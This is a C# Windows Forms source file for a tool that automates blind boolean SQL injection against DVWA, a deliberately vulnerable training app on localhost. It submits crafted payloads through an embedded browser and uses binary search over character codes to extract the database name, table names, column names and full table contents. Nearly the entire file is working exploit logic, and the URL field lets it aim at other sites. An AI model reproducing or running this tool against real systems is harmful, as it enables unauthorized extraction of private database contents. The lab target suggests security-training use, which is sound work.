using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Tool_SqlInjectionBlind_Dvwa
{
    public partial class frm_Main : Form
    {
        public frm_Main()
        {
            InitializeComponent();
            this.vp = new Tool_SqlInjectionBlind_Dvwa.ViewProcess();
            vp.Show();

            wbro_Brower.Navigate("http://localhost/dvwa/login.php");

            wbro_Brower.ScriptErrorsSuppressed = true;
        }

        HtmlDocument html_Document_Current;

        private string html;


        private string sql;

        #region Creating drag form by pnl_ControlBar
        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void pnl_Header_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, 0xA1, 0x2, 0);
            }
        }
        #endregion

        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool InternetSetCookie(string lpszUrlName, string lpszCookieName, string lpszCookieData);

        private void btn_Power_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("App will be shutdown. Are you sure?", "Warning", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
                System.Windows.Forms.Application.Exit();
        }

        private void btn_ViewHTHL_Click(object sender, EventArgs e)
        {
            frm_ViewHTML view_HTML = new frm_ViewHTML(this.html);
            view_HTML.ShowDialog();
        }

        private void PutData(string sql)
        {
            vp.rtxt_View.Text += sql + Environment.NewLine;
            wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("id")[0].SetAttribute("value", sql); //coplete data to textbox
            wbro_Brower.Document.GetElementsByTagName("input").GetElementsByName("Submit")[0].InvokeMember("click"); // call event click button submit
        }


        int left = 0;
        int right = 255;
        int mid = 127;
        bool btn_Click = false;
        bool is_Done = false;
        string str_result = "";

        int index = 0;
        bool count_Tables_Done = false;
        bool is_Click_btn_DatabaseName = false;
        bool is_Click_btn_TablesName = false;


        private void wbro_Brower_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            txt_Url.Text = wbro_Brower.Url.ToString();
            html = wbro_Brower.DocumentText;

            html_Document_Current = wbro_Brower.Document;

            if (btn_Click)
            {
                ResultRequest.Result result = Handing.GetResultSubmit(html_Document_Current);
                ResultRequest.Job work_state = ResultRequest.Job.None;

                if (is_Click_btn_DatabaseName)
                {
                    work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.DB_Name,
                        ref sql, ref left, ref right, ref mid, ref str_result);
                }
                else if(is_Click_btn_TablesName)
                {
                    if (count_Tables_Done)
                    {
                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.TABLES_NAME,
                            ref sql, ref left, ref right, ref mid, ref str_result);
                    }
                    else
                    {
                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.TABLES_NAME,
                            ref sql, ref left, ref right, ref mid, ref str_result);
                    }
                }
                else if(Confirm.Is_Click_btnGNameColumns)
                {
                    if(Confirm.Find_Quantity_Done)
                    {
                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.COLUMNS_NAME,
                            ref sql, ref left, ref right, ref mid, ref str_result);
                    }
                    else
                    {
                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.COLUMNS_NAME,
                           ref sql, ref left, ref right, ref mid, ref str_result);
                    }
                }
                else if(Confirm.Is_Click_btnGetData)
                {
                    if(!Confirm.Find_Quantity_Row_Done.Contains(false))
                    {
                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.DATA_TABLE,
                            ref sql, ref left, ref right, ref mid, ref str_result);
                    }
                    else
                    {
                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.DATA_TABLE,
                            ref sql, ref left, ref right, ref mid, ref str_result);
                    }
                }


                if (work_state == ResultRequest.Job.Done_ALL)
                {
                    if(is_Click_btn_DatabaseName)
                    {
                        is_Click_btn_DatabaseName = false;
                    }
                    else if(is_Click_btn_TablesName)
                    {
                        if(count_Tables_Done) // print table name
                        {
                            index = 0;
                            if (Variable.Index_Tables < Variable.Quantity_Tables)
                            {
                                Variable.Index_Tables++;
                                left = 0; right = 255; mid = 127;
                                btn_GetTBsName.PerformClick();
                                return;
                            }
                            else // all done
                            {
                                index = 0;
                                is_Click_btn_TablesName = false;
                                btn_Click = false;

                                cmb_TbsName.Items.Add(Variable.Db_TablesName);
                                return;
                            }
                        }
                        else
                        {
                            lbl_Count_TBsName.Text += str_result;
                            Variable.Quantity_Tables = Convert.ToInt32(str_result);
                            count_Tables_Done = true;
                            left = 0; right = 255; mid = 127; index = 0;
                            btn_GetTBsName.PerformClick();
                            return;
                        }
                        
                    }
                    else if(Confirm.Is_Click_btnGNameColumns)
                    {
                        if(Confirm.Find_Quantity_Done)
                        {
                            Variable.Index_Columns++;
                            if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
                            {
                                Variable.Index_Columns = 0;
                                Variable.Index_Tables++;
                            }
                            index = 0; left = 0; right = 255; mid = 127;
                            btn_GetColsName.PerformClick();
                            return;
                        }
                        else
                        {
                            Variable.Quantity_Columns[Variable.Index_Tables] = Convert.ToInt32(str_result);
                            str_result = "";
                            Variable.Index_Tables++; 

                            left = 0; right = 255; mid = 127; index = 0;
                            btn_GetColsName.PerformClick();
                            return;
                        }
                    }
                    else if(Confirm.Is_Click_btnGetData)
                    {
                        if(Confirm.Find_Quantity_Row_Done.Contains(false)) //don't complete
                        {
                            Variable.Quantity_Row[Variable.Index_Tables] = Convert.ToInt32(str_result);
                            Confirm.Find_Quantity_Row_Done[Variable.Index_Tables] = true;

                            left = 0; right = 255; mid = 127; index = 0;
                            btn_GetData.PerformClick();

                            return;
                        }
                        else
                        {
                            Variable.Index_Columns++;

                            if(Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
                            {
                                Variable.Index_Columns = 0;
                                Variable.Index_Rows++;
                                if(Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
                                {
                                    Variable.Index_Rows = 0;
                                    Variable.Index_Tables++;
                                }
                            }
                            else
                            {
                                while (true)
                                {
                                    if (Variable.Index_Tables >= Variable.Quantity_Tables)
                                    {
                                        return;
                                    }
                                    else
                                    {
                                        if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
                                        {
                                            Variable.Index_Columns = 0;
                                            Variable.Index_Rows++;
                                            if (Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
                                            {
                                                Variable.Index_Rows = 0;
                                                Variable.Index_Tables++;
                                            }
                                        }
                                        else if (!clb_ColsName.GetItemChecked(clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns])))
                                        {
                                            Variable.Index_Columns++;
                                        }
                                        else
                                            break;
                                    }
                                }
                            }

                            index = 0; left = 0; right = 255; mid = 127;
                            btn_GetData.PerformClick();
                            return;
                        }
                    }

                    btn_Click = false;

                }
                else if(work_state == ResultRequest.Job.Done_OnePart)
                {
                    if (is_Click_btn_DatabaseName)
                    {
                        lbl_Result_DBName.Text += str_result;
                        Variable.Db_Name += str_result;

                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DB_Name, ref index);
                    }
                    else if(is_Click_btn_TablesName)
                    {
                        Variable.Db_TablesName[Variable.Index_Tables] += str_result;
                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
                    }
                    else if(Confirm.Is_Click_btnGNameColumns)
                    {
                        Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] += str_result;
                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.COLUMNS_NAME, ref index);
                    }
                    else if(Confirm.Is_Click_btnGetData)
                    {
                        Variable.Bd_DataTable[Variable.Index_Tables][Variable.Index_Rows][Variable.Index_Columns] += str_result;
                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DATA_TABLE, ref index);

                        DataTable d_table = new DataTable(cmb_Tables.Text);
                        DataColumn d_col;
                        DataRow d_row;

                        for(int col = 0; col < Variable.Quantity_Columns[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)]; col++)
                        {
                            d_col = new DataColumn(Variable.Db_ColumnsName[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][col]);
                            d_table.Columns.Add(d_col);
                        }

                        for(int row = 0; row < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)].Count; row++)
                        {
                            d_row = d_table.NewRow();
                            for (int col = 0; col < Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row].Count; col++)
                            {
                                d_row[col] = Variable.Bd_DataTable[Variable.Db_TablesName.IndexOf(cmb_Tables.Text)][row][col];
                            }
                            d_table.Rows.Add(d_row);
                        }

                        dgv_Data.DataSource = d_table;
                        
                    }
                    

                    PutData(sql);
                }
                else if(work_state == ResultRequest.Job.Continue)
                {   
                    PutData(sql);
                }
            }

        }

        private void btn_Go_Click(object sender, EventArgs e)
        {
            if(txt_Url.Text == String.Empty)
            {
                txt_Url.Focus();
            }
            else
            {
                wbro_Brower.Url = new Uri(txt_Url.Text);
            }
        }
        

        private void button1_Click(object sender, EventArgs e)
        {
            btn_Click = true;
            is_Click_btn_DatabaseName = true;

            sql = "1' AND ascii(lower(substring((SELECT DATABASE()), 0,1))) >= 127 #";

            sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DB_Name, ref index);
            PutData(sql);

            btn_GetDBName.Enabled = false;
        }


        private void btn_GetTBsName_Click(object sender, EventArgs e)
        {
            btn_Click = true;

            is_Click_btn_TablesName = true;

            if (count_Tables_Done)
            {
                if(Variable.Db_TablesName.Count == 0)
                {
                   for(int run = 0; run < Variable.Quantity_Tables; run++)
                    {
                        Variable.Db_TablesName.Add("");
                    }
                }
                sql = "1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                if (Variable.Index_Tables < Variable.Quantity_Tables)
                {
                    sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
                    PutData(sql);
                }
                else
                {
                    foreach(string str in Variable.Db_TablesName)
                    {
                        lbl_TBsName.Text += " '" + str + "'";
                    }
                    btn_GetTBsName.Enabled = false;
                    is_Click_btn_TablesName = false;
                    count_Tables_Done = false;
                    str_result = "";
                }
            }
            else
            {
                Variable.Index_Tables = 0;

                sql = "1' AND (SELECT COUNT(*) FROM information_schema.TABLES WHERE TABLE_SCHEMA LIKE 'dvwa') >= 127 #";

                PutData(sql);
            }

        }

        private void btn_GetColsName_Click(object sender, EventArgs e)
        {
            if(Variable.Quantity_Tables != 0)
            {
                btn_Click = true;
                Confirm.Is_Click_btnGNameColumns = true;


                if(Confirm.Find_Quantity_Done) //had quantity
                {
                    if(Variable.Db_ColumnsName.Count == 0)
                    {
                        for(int row = 0; row < Variable.Quantity_Tables; row++)
                        {
                            List<string> temp = new List<string>();
                            for(int col = 0; col < Variable.Quantity_Columns[row]; col++)
                            {
                                temp.Add("");
                            }
                            Variable.Db_ColumnsName.Add(temp);
                        }
                        Variable.Index_Columns = Variable.Index_Tables = 0;
                        index = 0;
                    }
                    //ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
                    
                    if(Variable.Index_Tables < Variable.Quantity_Tables)
                    {
                        sql = "1' AND ascii(lower(substring((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "' LIMIT 0, 1), 0, 1))) >= 127 #";
                        if (Variable.Index_Columns < Variable.Quantity_Columns[Variable.Index_Tables])
                        {
                            sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.COLUMNS_NAME, ref index);

                            PutData(sql);
                        }
                    }
                    else
                    {
                        cmb_Tables.Items.Add("ALL");
                        foreach (string str in Variable.Db_TablesName)
                        {
                            cmb_TbsName.Items.Add(str);
                            cmb_Tables.Items.Add(str);
                        }
                        cmb_TbsName.SelectedIndex = 0;
                        cmb_Tables.SelectedIndex = 0;

                        foreach(List<string> ls in Variable.Db_ColumnsName)
                        {
                            foreach(string str in ls)
                            {
                                clb_ColsName.Items.Add(str, true);
                            }
                        }

                        btn_GetTBsName.Enabled = false;
                        btn_Click = false;
                        Variable.Index_Columns = Variable.Index_Tables = 0;
                        Confirm.Is_Click_btnGNameColumns = false;
                        left = 0; right = 255; mid = 127; index = 0;

                        return;
                    }
                }
                else // count quantity
                {
                    if (Variable.Quantity_Columns.Count == 0)
                    {
                        Variable.Index_Tables = 0;
                        for (int run = 0; run < Variable.Quantity_Tables; run++)
                        {
                            Variable.Quantity_Columns.Add(0);
                        }

                    }
                    if(Variable.Index_Tables < Variable.Quantity_Tables)
                    {

                        //sql = "1' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE 'guestbook') >= 127 #";
                        sql = "1' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "') >= 127 #";

                        PutData(sql);
                    }
                    else //find done
                    {
                        Confirm.Find_Quantity_Done = true;

                        Variable.Index_Tables = 0;
                        Variable.Index_Columns = 0;
                        btn_GetColsName.PerformClick();
                        return;
                    }
                }
            }
        }

        private void btn_GetData_Click(object sender, EventArgs e)
        {
            if (Variable.Db_TablesName.Count != 0) //find tables name done
            {
                if (Variable.Db_ColumnsName[0].Count != 0) //find columns name done
                {
                    btn_Click = true;
                    Confirm.Is_Click_btnGetData = true;

                    if (Confirm.Find_Quantity_Row_Done.Count != 0 && !Confirm.Find_Quantity_Row_Done.Contains(false))
                    {
                        if (Variable.Bd_DataTable.Count == 0)
                        {
                            for (int tb = 0; tb < Variable.Quantity_Tables; tb++)
                            {
                                List<List<string>> data_table = new List<List<string>>();
                                for (int row = 0; row < Variable.Quantity_Row[tb]; row++)
                                {
                                    List<string> data_row = new List<string>();
                                    for (int col = 0; col < Variable.Quantity_Columns[tb]; col++)
                                    {
                                        data_row.Add("");
                                    }
                                    data_table.Add(data_row);
                                }
                                Variable.Bd_DataTable.Add(data_table);
                            }
                            Variable.Index_Columns = Variable.Index_Rows = Variable.Index_Tables = 0;
                        }

                        while (true)
                        {
                            if (Variable.Index_Tables >= Variable.Quantity_Tables)
                            {
                                List<List<List<string>>> a = Variable.Bd_DataTable;
                                return;
                            }
                            else
                            {
                                if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
                                {
                                    Variable.Index_Columns = 0;
                                    Variable.Index_Rows++;
                                    if (Variable.Index_Rows >= Variable.Quantity_Row[Variable.Index_Tables])
                                    {
                                        Variable.Index_Rows = 0;
                                        Variable.Index_Tables++;
                                    }
                                }
                                else if (!clb_ColsName.GetItemChecked(clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns])))
                                {
                                    Variable.Index_Columns++;
                                }
                                else
                                    break;
                            }
                        }

                        sql = "1' AND ascii(lower(substring((SELECT " + Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] + " from dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + " LIMIT 0, 1), 0, 1))) >= 127 #";
                        if (Variable.Index_Tables < Variable.Quantity_Tables)
                        {
                            if (Variable.Index_Rows < Variable.Quantity_Row[Variable.Index_Tables])
                            {
                                if (Variable.Index_Columns < Variable.Quantity_Columns[Variable.Index_Tables])
                                {
                                    sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.DATA_TABLE, ref index);

                                    PutData(sql);
                                }
                            }
                            else
                            {
                                List<List<List<string>>> a = Variable.Bd_DataTable;
                            }

                        }
                    }
                    else //count quantity don't complete
                    {
                        if (Confirm.Find_Quantity_Row_Done.Count == 0)
                        {
                            for (int run = 0; run < Variable.Quantity_Tables; run++)
                            {
                                Confirm.Find_Quantity_Row_Done.Add(false);
                                Variable.Quantity_Row.Add(0);
                            }
                            Variable.Index_Tables = 0;
                            str_result = "";
                            sql = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";

                            PutData(sql);
                        }
                        else
                        {

                            for (int run = 0; run < Confirm.Find_Quantity_Row_Done.Count; run++)
                            {
                                if (Confirm.Find_Quantity_Row_Done[run] == false)
                                {
                                    Variable.Index_Tables = run;
                                    break;
                                }
                            }
                            //count row
                            str_result = "";
                            sql = "1' AND (SELECT COUNT(*) FROM dvwa." + Variable.Db_TablesName[Variable.Index_Tables] + ") >= 127 #";

                            PutData(sql);

                        }
                    }
                }
            }
        }

        private void cmb_TbsName_SelectedIndexChanged(object sender, EventArgs e)
        {
            cmb_Cols_Name.Items.Clear();
            if(cmb_TbsName.Items.Count != 0)
            {
                for(int index_val = 0; index_val < Variable.Db_ColumnsName[cmb_TbsName.SelectedIndex].Count; index_val++)
                {
                    cmb_Cols_Name.Items.Add(Variable.Db_ColumnsName[cmb_TbsName.SelectedIndex][index_val]);
                }
                cmb_Cols_Name.SelectedIndex = 0;
            }
        }

        private void cmb_Tables_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cmb_Tables.SelectedIndex != 0)
            {
                for (int idex = 0; idex < clb_ColsName.Items.Count; idex++) //uncheck
                {
                    clb_ColsName.SetItemChecked(idex, false);
                }

                for (int idex = 0; idex < Variable.Quantity_Columns[cmb_Tables.SelectedIndex - 1]; idex++)
                {
                    int aaa = clb_ColsName.Items.IndexOf(Variable.Db_ColumnsName[cmb_Tables.SelectedIndex - 1][idex]);
                    clb_ColsName.SetItemChecked(aaa, true);
                }
            }
            else // index == 0 // all
            {
                for(int idex= 0; idex < clb_ColsName.Items.Count; idex++)
                {
                    clb_ColsName.SetItemChecked(idex, true);
                }
            }
        }
    }
}
